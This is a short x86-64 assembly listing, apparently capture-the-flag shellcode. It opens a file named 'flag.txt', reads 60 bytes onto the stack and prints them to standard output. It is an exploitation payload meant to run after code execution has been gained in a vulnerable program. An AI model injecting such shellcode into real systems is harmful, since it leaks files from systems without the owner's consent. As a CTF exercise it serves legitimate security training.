push 0x00
mov rbx, 0x7478742e67616c66
push rbx
mov rax, 2
mov rdi, rsp
mov rsi, 0
syscall

mov rdi, rax

push 0x41414141
push 0x41414141
push 0x41414141
push 0x41414141

mov rax, 0
mov rsi, rsp
mov rdx, 60
syscall

mov rsi, rsp

mov rax, 1
mov rdi, 1
	syscall
	
